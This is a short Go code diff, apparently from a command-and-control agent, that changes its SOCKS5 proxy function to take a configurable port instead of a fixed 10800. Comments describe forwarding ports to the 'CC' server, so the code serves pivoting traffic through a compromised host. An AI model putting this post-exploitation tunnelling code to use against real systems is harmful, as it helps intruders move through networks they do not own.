@@ -27,7 +27,27 @@ type PortFwdSession struct {
 var PortFwds = make(map[string]*PortFwdSession)
 
 // Socks5Proxy sock5 proxy server on agent, to use it, forward port 10800 to CC
-func Socks5Proxy(op string) (err error) {
+func Socks5Proxy(op string, port string) (err error) {
+	socks5Start := func() {
+		var err error
+		if ProxyServer == nil {
+			socks5.Debug = true
+			ProxyServer, err = socks5.NewClassicServer("127.0.0.1:"+port, "127.0.0.1", "", "", 0, 0, 0, 60)
+			if err != nil {
+				log.Println(err)
+				return
+			}
+		}
+
+		log.Print("Socks5Proxy started")
+		err = ProxyServer.Run(nil)
+		if err != nil {
+			log.Println(err)
+		}
+		log.Print("Socks5Proxy stopped")
+	}
+
+	// op
 	switch op {
 	case "on":
 		go socks5Start()
@@ -46,25 +66,6 @@ func Socks5Proxy(op string) (err error) {
 	}
 
 	return err
-}
-
-func socks5Start() {
-	var err error
-	if ProxyServer == nil {
-		socks5.Debug = true
-		ProxyServer, err = socks5.NewClassicServer("127.0.0.1:10800", "127.0.0.1", "", "", 0, 0, 0, 60)
-		if err != nil {
-			log.Println(err)
-			return
-		}
-	}
-
-	log.Print("Socks5Proxy started")
-	err = ProxyServer.Run(nil)
-	if err != nil {
-		log.Println(err)
-	}
-	log.Print("Socks5Proxy stopped")
 }
 
 // PortFwd port mapping, receive CC's request data then send it to target port on agent
